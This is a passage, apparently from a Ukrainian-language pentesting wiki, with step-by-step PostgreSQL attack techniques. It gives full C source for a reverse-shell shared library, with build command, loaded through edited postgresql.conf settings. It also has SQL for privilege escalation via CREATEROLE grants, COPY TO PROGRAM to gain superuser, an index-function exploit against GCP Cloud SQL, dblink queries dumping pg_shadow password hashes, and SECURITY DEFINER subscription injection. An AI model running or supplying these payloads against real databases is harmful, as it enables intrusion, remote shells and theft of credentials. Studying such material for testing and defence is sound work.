–ú–∏ –º–æ–∂–µ–º–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `dynamic_library_path` –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥, –≤ —è–∫–æ–º—É –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º `postgres`, —è–∫–∏–π –∑–∞–ø—É—Å–∫–∞—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–∞—Ç–∞–ª–æ–≥ `/tmp/`, —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ç—É–¥–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –æ–±'—î–∫—Ç `.so`. –î–∞–ª—ñ –º–∏ –∑–º—É—Å–∏–º–æ —Å–µ—Ä–≤–µ—Ä PostgreSQL –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–∞—à—É –Ω–æ–≤—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É, –≤–∫–ª—é—á–∏–≤—à–∏ —ó—ó –≤ –∑–º—ñ–Ω–Ω—É `session_preload_libraries`.

–ö—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏:

1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π `postgresql.conf`
2. –í–∫–ª—é—á—ñ—Ç—å –∫–∞—Ç–∞–ª–æ–≥ `/tmp/` —É –∑–Ω–∞—á–µ–Ω–Ω—è `dynamic_library_path`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `dynamic_library_path = '/tmp:$libdir'`
3. –í–∫–ª—é—á—ñ—Ç—å –Ω–∞–∑–≤—É —à–∫—ñ–¥–ª–∏–≤–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —É –∑–Ω–∞—á–µ–Ω–Ω—è `session_preload_libraries`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `session_preload_libraries = 'payload.so'`
4. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Å–Ω–æ–≤–Ω—É –≤–µ—Ä—Å—ñ—é PostgreSQL —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Ç `SELECT version()`
5. –°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –∫–æ–¥ —à–∫—ñ–¥–ª–∏–≤–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º –ø–∞–∫–µ—Ç–æ–º —Ä–æ–∑—Ä–æ–±–∫–∏ PostgreSQL. –ü—Ä–∏–∫–ª–∞–¥ –∫–æ–¥—É:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

–ö–æ–º–ø—ñ–ª—è—Ü—ñ—è –∫–æ–¥—É:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —à–∫—ñ–¥–ª–∏–≤–∏–π `postgresql.conf`, —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –Ω–∞ –∫—Ä–æ–∫–∞—Ö 2-3, —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª
7. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ `payload.so` –∑ –∫—Ä–æ–∫—É 5 –≤ –∫–∞—Ç–∞–ª–æ–≥ `/tmp`
8. –ü–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Å–µ—Ä–≤–µ—Ä–∞, –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–≤—à–∏ —Å–µ—Ä–≤–µ—Ä –∞–±–æ –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ –∑–∞–ø–∏—Ç `SELECT pg_reload_conf()`
9. –ü—ñ–¥ —á–∞—Å –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –ë–î –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∑–≤–æ—Ä–æ—Ç–Ω–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –æ–±–æ–ª–æ–Ω–∫–∏.
## **–ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ Postgres**

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ CREATEROLE

#### **–ù–∞–¥–∞–Ω–Ω—è**

–ó–≥—ñ–¥–Ω–æ –∑ [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é**](https://www.postgresql.org/docs/13/sql-grant.html): _–†–æ–ª—ñ, —è–∫—ñ –º–∞—é—Ç—å –ø—Ä–∏–≤—ñ–ª–µ—ó **`CREATEROLE`**, –º–æ–∂—É—Ç—å **–Ω–∞–¥–∞–≤–∞—Ç–∏ –∞–±–æ –∑–∞–±–∏—Ä–∞—Ç–∏ —á–ª–µ–Ω—Å—Ç–≤–æ –≤ –±—É–¥—å-—è–∫—ñ–π —Ä–æ–ª—ñ**, —è–∫–∞ **–Ω–µ —î** **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**._

–û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ–∑–≤—ñ–ª **`CREATEROLE`**, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—à–∏—Ö **—Ä–æ–ª–µ–π** (—è–∫—ñ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏), —â–æ –º–æ–∂–µ –¥–∞—Ç–∏ –≤–∞–º –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —á–∏—Ç–∞—Ç–∏ —Ç–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### –ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å

–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ —Ü—ñ—î—é —Ä–æ–ª–ª—é —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å **–∑–º—ñ–Ω—é–≤–∞—Ç–∏** **–ø–∞—Ä–æ–ª—ñ** —ñ–Ω—à–∏—Ö **–Ω–µ—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### –ü—ñ–¥–Ω—è—Ç—Ç—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ SUPERUSER

–î–æ—Å–∏—Ç—å —á–∞—Å—Ç–æ –º–æ–∂–Ω–∞ –≤–∏—è–≤–∏—Ç–∏, —â–æ **–ª–æ–∫–∞–ª—å–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å —É–≤—ñ–π—Ç–∏ –≤ PostgreSQL, –Ω–µ –≤–∫–∞–∑—É—é—á–∏ –∂–æ–¥–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –º–∞—î—Ç–µ **–¥–æ–∑–≤—ñ–ª –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ä–æ–ª—å **`SUPERUSER`**.
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
–¶–µ –∑–∞–∑–≤–∏—á–∞–π –º–æ–∂–ª–∏–≤–æ —á–µ—Ä–µ–∑ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä—è–¥–∫–∏ —É —Ñ–∞–π–ª—ñ **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
### **ALTER TABLE –ø—Ä–∏–≤—ñ–ª–µ—ó**

–£ [**—Ü—å–æ–º—É –æ–ø–∏—Å—ñ**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) –ø–æ—è—Å–Ω–µ–Ω–æ, —è–∫ –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ **–ø—ñ–¥–Ω—è—Ç–∏—Å—è –≤ –ø—Ä–∏–≤—ñ–ª–µ—è—Ö** –≤ Postgres GCP, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—î–º ALTER TABLE, —è–∫–∏–π –±—É–≤ –Ω–∞–¥–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ.

–ö–æ–ª–∏ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è **–∑—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–ª–∞—Å–Ω–∏–∫–æ–º —Ç–∞–±–ª–∏—Ü—ñ**, –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø–æ–º–∏–ª–∫—É**, —è–∫–∞ —Ü—å–æ–º—É –∑–∞–ø–æ–±—ñ–≥–∞—î, –∞–ª–µ, –∑–¥–∞—î—Ç—å—Å—è, GCP –Ω–∞–¥–∞–≤ —Ü—é **–æ–ø—Ü—ñ—é –Ω–µ-—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É postgres** –≤ GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

–ü–æ—î–¥–Ω—É—é—á–∏ —Ü—é —ñ–¥–µ—é –∑ —Ç–∏–º, —â–æ –∫–æ–ª–∏ **–≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–∏ INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) –Ω–∞ **—Ç–∞–±–ª–∏—Ü—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é —ñ–Ω–¥–µ–∫—Å—É**, **—Ñ—É–Ω–∫—Ü—ñ—è** –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —è–∫ —á–∞—Å—Ç–∏–Ω–∞ –∫–æ–º–∞–Ω–¥–∏ –∑ **–ø—Ä–∞–≤–∞–º–∏ –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞–±–ª–∏—Ü—ñ**. –ú–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —ñ–Ω–¥–µ–∫—Å –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é, –Ω–∞–¥–∞—Ç–∏ –ø—Ä–∞–≤–∞ –≤–ª–∞—Å–Ω–æ—Å—Ç—ñ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É** –Ω–∞–¥ —Ü—ñ—î—é —Ç–∞–±–ª–∏—Ü–µ—é, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ–Ω–∞—Ç–∏ ANALYZE –Ω–∞–¥ —Ç–∞–±–ª–∏—Ü–µ—é –∑—ñ –∑–ª–æ–≤–º–∏—Å–Ω–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é, —è–∫–∞ –∑–º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–∏–≤—ñ–ª–µ—ó –≤–ª–∞—Å–Ω–∏–∫–∞.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

1. –ü–æ—á–Ω—ñ—Ç—å –∑ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ—ó —Ç–∞–±–ª–∏—Ü—ñ.
2. –í—Å—Ç–∞–≤—Ç–µ –¥–µ—è–∫–∏–π –Ω–µ—Å–ø—ñ–≤–º—ñ—Ä–Ω–∏–π –≤–º—ñ—Å—Ç —É —Ç–∞–±–ª–∏—Ü—é, —â–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ—ó —ñ–Ω–¥–µ–∫—Å—É.
3. –†–æ–∑—Ä–æ–±—ñ—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é —ñ–Ω–¥–µ–∫—Å—É, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –≤–∏–∫–æ–Ω–∞–≤—á–∏–π –∫–æ–¥, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏.
4. –ó–º—ñ–Ω—ñ—Ç—å –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞–±–ª–∏—Ü—ñ –Ω–∞ "cloudsqladmin", —è–∫–∏–π —î —Ä–æ–ª–ª—é —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ GCP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–æ—é –≤–∏–∫–ª—é—á–Ω–æ Cloud SQL –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ç–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
5. –í–∏–∫–æ–Ω–∞–π—Ç–µ –æ–ø–µ—Ä–∞—Ü—ñ—é ANALYZE –Ω–∞ —Ç–∞–±–ª–∏—Ü—ñ. –¶—è –¥—ñ—è –∑–º—É—à—É—î –¥–≤–∏–≥—É–Ω PostgreSQL –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞–±–ª–∏—Ü—ñ "cloudsqladmin". –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è —ñ–Ω–¥–µ–∫—Å—É –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ "cloudsqladmin", —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ä–∞–Ω—ñ—à–µ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω—É –æ–±–æ–ª–æ–Ω–∫–æ–≤—É –∫–æ–º–∞–Ω–¥—É.

–£ PostgreSQL —Ü–µ–π –ø—Ä–æ—Ü–µ—Å –≤–∏–≥–ª—è–¥–∞—î –ø—Ä–∏–±–ª–∏–∑–Ω–æ —Ç–∞–∫:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
–¢–æ–¥—ñ —Ç–∞–±–ª–∏—Ü—è `shell_commands_results` –±—É–¥–µ –º—ñ—Å—Ç–∏—Ç–∏ –≤–∏–≤—ñ–¥ –≤–∏–∫–æ–Ω–∞–Ω–æ–≥–æ –∫–æ–¥—É:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### –õ–æ–∫–∞–ª—å–Ω–∏–π –≤—Ö—ñ–¥

–î–µ—è–∫—ñ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ postgresql –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª—è—Ç–∏ –≤—Ö—ñ–¥ –±—É–¥—å-—è–∫–æ–º—É –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ, –º–æ–∂–ª–∏–≤–æ –ª–æ–∫–∞–ª—å–Ω–∏–π –≤—Ö—ñ–¥ –∑ 127.0.0.1 –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ **–ø–æ—Ç—Ä—ñ–±–Ω–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó `dblink`**. –Ø–∫—â–æ —ó—ó –Ω–µ–º–∞—î, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —ó—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

–Ø–∫—â–æ —É –≤–∞—Å —î –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –±—ñ–ª—å—à–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏, –∞–ª–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ –≤—Ö—ñ–¥ –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó IP-–∞–¥—Ä–µ—Å–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ —è–∫ —Ü–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
–ú–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —ñ—Å–Ω—É—î —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **–í–ª–∞—Å–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –∑** SECURITY DEFINER

[**–£ —Ü—å–æ–º—É –æ–ø–∏—Å—ñ**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä–∏ –∑–º–æ–≥–ª–∏ –ø—ñ–¥–Ω—è—Ç–∏—Å—è –≤ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ postgres, –Ω–∞–¥–∞–Ω–æ–≥–æ IBM, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ **–∑–Ω–∞–π—à–ª–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é –∑ –ø—Ä–∞–ø–æ—Ä—Ü–µ–º SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

–Ø–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó**](https://www.postgresql.org/docs/current/sql-createfunction.html), —Ñ—É–Ω–∫—Ü—ñ—è –∑ **SECURITY DEFINER –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è** –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π —ó—ó –≤–æ–ª–æ–¥—ñ—î**. –¢–æ–º—É, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è **–≤—Ä–∞–∑–ª–∏–≤–∞ –¥–æ SQL-—ñ–Ω'—î–∫—Ü—ñ–π** –∞–±–æ –≤–∏–∫–æ–Ω—É—î **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, —è–∫—ñ –∫–æ–Ω—Ç—Ä–æ–ª—é—é—Ç—å—Å—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º**, —ó—ó –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–ø—ñ–¥–Ω—è—Ç—Ç—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ postgres**.

–ù–∞ —Ä—è–¥–∫—É 4 –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∫–æ–¥—É –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è –º–∞—î –ø—Ä–∞–ø–æ—Ä–µ—Ü—å **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
–Ü –ø–æ—Ç—ñ–º **–≤–∏–∫–æ–Ω–∞–π—Ç–µ –∫–æ–º–∞–Ω–¥–∏**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### –ü—Ä–æ–π–¥—ñ—Ç—å Burteforce –∑ PL/pgSQL

**PL/pgSQL** - —Ü–µ **–ø–æ–≤–Ω–æ—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∞ –º–æ–≤–∞ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è**, —è–∫–∞ –ø—Ä–æ–ø–æ–Ω—É—î –±—ñ–ª—å—à–∏–π –ø—Ä–æ—Ü–µ–¥—É—Ä–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –ø–æ—Ä—ñ–≤–Ω—è–Ω–æ –∑ SQL. –í–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Ü–∏–∫–ª–∏** —Ç–∞ —ñ–Ω—à—ñ **—Å—Ç—Ä—É–∫—Ç—É—Ä–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è**, —â–æ–± –ø–æ–∫—Ä–∞—â–∏—Ç–∏ –ª–æ–≥—ñ–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏. –ö—Ä—ñ–º —Ç–æ–≥–æ, **SQL-–æ–ø–µ—Ä–∞—Ç–æ—Ä–∏** —Ç–∞ **—Ç—Ä–∏–≥–µ—Ä–∏** –º–æ–∂—É—Ç—å –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–º–æ–≤–∏ PL/pgSQL**. –¶—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –¥–æ–∑–≤–æ–ª—è—î –±—ñ–ª—å—à –∫–æ–º–ø–ª–µ–∫—Å–Ω–∏–π —Ç–∞ –≥–Ω—É—á–∫–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è —Ç–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –±–∞–∑ –¥–∞–Ω–∏—Ö.\
**–í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –º–æ–≤–æ—é, —â–æ–± –∑–∞–ø—Ä–æ—Å–∏—Ç–∏ PostgreSQL –Ω–∞ –ø–µ—Ä–µ–±—ñ—Ä –ª–æ–≥—ñ–Ω—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞–Ω–Ω—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Ç–∞–±–ª–∏—Ü—å PostgreSQL

{% hint style="info" %}
